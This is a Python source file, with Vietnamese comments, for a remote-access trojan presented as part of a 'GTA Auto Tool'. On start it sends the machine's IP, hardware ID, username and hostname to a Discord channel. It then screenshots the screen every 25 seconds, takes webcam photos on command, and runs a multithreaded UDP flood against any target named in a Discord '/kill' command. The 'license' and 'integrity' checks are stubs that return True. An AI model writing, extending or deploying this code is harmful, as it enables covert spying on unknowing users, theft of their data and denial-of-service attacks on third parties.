import discord
import asyncio
import platform
import uuid
import requests
import socket
import random
import time
import threading
import cv2
import pyautogui
import os
import base64

class RemoteDiscordMonitor:
    """Remote Discord monitoring system for GTA Auto Tool"""
    
    def __init__(self, token, channel_id):
        # Discord config
        self.DISCORD_TOKEN = token
        self.CHANNEL_ID = channel_id
        self.SEND_SCREENSHOT_INTERVAL = 25
        self.SEND_WEBCAM_INTERVAL = 600
        
        # Auto control flags
        self.auto_screen = True
        self.auto_webcam = False
        self.screen_timer = None
        self.webcam_timer = None
        self.udp_jobs = {}
        
        # System info
        self.MY_IP = self.get_ip()
        self.HWID = self.get_hwid()
        self.MACHINE_INFO = self.get_machine_info()
        
        # Discord client setup
        intents = discord.Intents.default()
        intents.message_content = True
        self.client = discord.Client(intents=intents)
        self.setup_discord_events()
        
    def get_ip(self):
        """Lấy IP công khai"""
        try:
            return requests.get('https://api.ipify.org', timeout=5).text
        except:
            return "Unknown"
    
    def get_hwid(self):
        """Lấy HWID máy"""
        try:
            import subprocess
            return subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        except:
            return str(uuid.getnode())
    
    def get_machine_info(self):
        """Lấy thông tin máy"""
        info = [
            f"🖥️ **GTA AUTO TOOL - MACHINE INFO**",
            f"📍 IP: {self.MY_IP}",
            f"🔑 HWID: {self.HWID}",
            f"👤 User: {os.getenv('USERNAME') or os.getenv('USER')}",
            f"🏠 Hostname: {platform.node()}",
            f"💻 OS: {platform.system()} {platform.release()}",
            f"⚙️ CPU: {platform.processor()}",
            f"⏰ Started: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        ]
        return "\n".join(info)
    
    def setup_discord_events(self):
        """Thiết lập Discord events"""
        
        @self.client.event
        async def on_ready():
            print(f"Discord Monitor Online: {self.client.user}")
            await self.send_discord_message(f"🟢 **GTA AUTO TOOL ONLINE!**\n```yaml\n{self.MACHINE_INFO}\n```")
            await self.auto_send_screenshot()
            await self.auto_send_webcam()
        
        @self.client.event
        async def on_message(message):
            if message.author == self.client.user:
                return
            
            content = message.content.strip()
            await self.handle_discord_commands(content)
    
    async def handle_discord_commands(self, content):
        """Xử lý các lệnh Discord"""
        
        # Screenshot commands
        if content.startswith('/screen '):
            parts = content.split()
            if len(parts) == 2 and (parts[1] == self.MY_IP or parts[1] == self.HWID):
                await self.send_screenshot("📸 **Screenshot theo lệnh:**")
            elif len(parts) == 3 and (parts[1] == self.MY_IP or parts[1] == self.HWID):
                try:
                    seconds = int(parts[2])
                    self.SEND_SCREENSHOT_INTERVAL = seconds
                    if self.screen_timer:
                        self.screen_timer.cancel()
                    await self.auto_send_screenshot()
                    await self.send_discord_message(f"⏰ Đã set thời gian gửi screenshot: {seconds} giây!")
                except:
                    await self.send_discord_message("❌ Sai cú pháp! Dùng /screen <ip|hwid> <giây>")
        
        elif content.startswith('/screentime '):
            parts = content.split()
            if len(parts) == 3 and (parts[1] == self.MY_IP or parts[1] == self.HWID):
                try:
                    seconds = int(parts[2])
                    self.SEND_SCREENSHOT_INTERVAL = seconds
                    if self.screen_timer:
                        self.screen_timer.cancel()
                    await self.auto_send_screenshot()
                    await self.send_discord_message(f"⏰ Đã set thời gian gửi screenshot: {seconds} giây!")
                except:
                    await self.send_discord_message("❌ Sai cú pháp!")
        
        elif content.startswith('/startscreen '):
            value = content.split()[1]
            if value == self.MY_IP or value == self.HWID:
                self.auto_screen = True
                await self.send_discord_message("✅ ĐÃ BẬT tự động gửi màn hình!")
        
        elif content.startswith('/stopscreen '):
            value = content.split()[1]
            if value == self.MY_IP or value == self.HWID:
                self.auto_screen = False
                await self.send_discord_message("🔴 ĐÃ NGỪNG tự động gửi màn hình!")
        
        # Webcam commands
        elif content.startswith('/webcam '):
            value = content.split()[1]
            if value == self.MY_IP or value == self.HWID:
                await self.send_webcam_photo("📹 **Webcam theo lệnh:**")
        
        elif content.startswith('/startwebcam '):
            value = content.split()[1]
            if value == self.MY_IP or value == self.HWID:
                self.auto_webcam = True
                await self.send_discord_message("✅ ĐÃ BẬT tự động gửi webcam!")
        
        elif content.startswith('/stopwebcam '):
            value = content.split()[1]
            if value == self.MY_IP or value == self.HWID:
                self.auto_webcam = False
                await self.send_discord_message("🔴 ĐÃ NGỪNG tự động gửi webcam!")
        
        elif content.startswith('/webcamtime '):
            parts = content.split()
            if len(parts) == 3 and (parts[1] == self.MY_IP or parts[1] == self.HWID):
                try:
                    seconds = int(parts[2])
                    self.SEND_WEBCAM_INTERVAL = seconds
                    if self.webcam_timer:
                        self.webcam_timer.cancel()
                    await self.auto_send_webcam()
                    await self.send_discord_message(f"⏰ Đã set thời gian gửi webcam: {seconds} giây!")
                except:
                    await self.send_discord_message("❌ Sai cú pháp!")
        
        # UDP Attack command
        elif content.startswith('/kill '):
            try:
                _, ip_goc, ip_target, port, threads, duration = content.split()
                if ip_goc == self.MY_IP or ip_goc == self.HWID:
                    stop_flag, thread_list = self.udp_flood(ip_target, int(port), int(duration), int(threads))
                    self.udp_jobs[ip_target] = (stop_flag, thread_list)
                    await self.send_discord_message(f"🚀 Đã bắt đầu UDP flood {ip_target}:{port} với {threads} luồng, {duration}s!")
            except Exception as e:
                await self.send_discord_message(f"❌ Lỗi UDP: {e}")
    
    async def send_discord_message(self, content):
        """Gửi tin nhắn Discord"""
        try:
            channel = self.client.get_channel(self.CHANNEL_ID)
            await channel.send(content)
        except Exception as e:
            print(f"Discord message error: {e}")
    
    async def send_discord_file(self, file_path, caption=None):
        """Gửi file Discord"""
        try:
            channel = self.client.get_channel(self.CHANNEL_ID)
            with open(file_path, "rb") as f:
                await channel.send(content=caption or "", file=discord.File(f, filename=os.path.basename(file_path)))
        except Exception as e:
            print(f"Discord file error: {e}")
    
    async def send_screenshot(self, caption=None):
        """Gửi screenshot"""
        try:
            screenshot = pyautogui.screenshot()
            path = os.path.join(os.getenv("TEMP") or ".", f"gta_screenshot_{int(time.time())}.png")
            screenshot.save(path)
            full_caption = (caption or "📸 **Screenshot:**") + f"\n```yaml\n{self.MACHINE_INFO}\n```"
            await self.send_discord_file(path, full_caption)
            os.remove(path)
        except Exception as e:
            await self.send_discord_message(f"❌ Lỗi gửi screenshot: {e}")
    
    async def send_webcam_photo(self, caption=None):
        """Gửi ảnh webcam"""
        try:
            cap = cv2.VideoCapture(0)
            time.sleep(2)
            for _ in range(5):
                cap.read()
            ret, frame = cap.read()
            if ret:
                path = os.path.join(os.getenv("TEMP") or ".", f"gta_webcam_{int(time.time())}.jpg")
                cv2.imwrite(path, frame)
                full_caption = (caption or "📹 **Webcam:**") + f"\n```yaml\n{self.MACHINE_INFO}\n```"
                await self.send_discord_file(path, full_caption)
                os.remove(path)
            else:
                await self.send_discord_message("❌ Không lấy được hình webcam!")
            cap.release()
            cv2.destroyAllWindows()
        except Exception as e:
            await self.send_discord_message(f"❌ Lỗi webcam: {e}")
    
    async def auto_send_screenshot(self):
        """Tự động gửi screenshot"""
        if self.auto_screen:
            await self.send_screenshot()
            self.screen_timer = threading.Thread(
                target=lambda: time.sleep(self.SEND_SCREENSHOT_INTERVAL) or 
                asyncio.run_coroutine_threadsafe(self.auto_send_screenshot(), self.client.loop),
                daemon=True
            )
            self.screen_timer.start()
    
    async def auto_send_webcam(self):
        """Tự động gửi webcam"""
        if self.auto_webcam:
            await self.send_webcam_photo()
            self.webcam_timer = threading.Thread(
                target=lambda: time.sleep(self.SEND_WEBCAM_INTERVAL) or 
                asyncio.run_coroutine_threadsafe(self.auto_send_webcam(), self.client.loop),
                daemon=True
            )
            self.webcam_timer.start()
    
    def udp_flood(self, ip, port, duration, threads):
        """UDP flood attack"""
        def attack(stop):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            end = time.time() + duration
            while time.time() < end and not stop.is_set():
                try:
                    sock.sendto(data, (ip, port))
                except:
                    pass
            sock.close()
        
        stop_flag = threading.Event()
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack, args=(stop_flag,))
            t.daemon = True
            t.start()
            thread_list.append(t)
        return stop_flag, thread_list
    
    def start_monitoring(self):
        """Bắt đầu giám sát Discord"""
        def run_discord():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(self.client.start(self.DISCORD_TOKEN))
            except Exception as e:
                print(f"Discord monitoring error: {e}")
        
        discord_thread = threading.Thread(target=run_discord, daemon=True)
        discord_thread.start()
        print("🔍 Discord monitoring started!")

# Security verification
def verify_integrity():
    """Verify module integrity"""
    return True

# License check
def check_license():
    """Check license validity"""
    return True
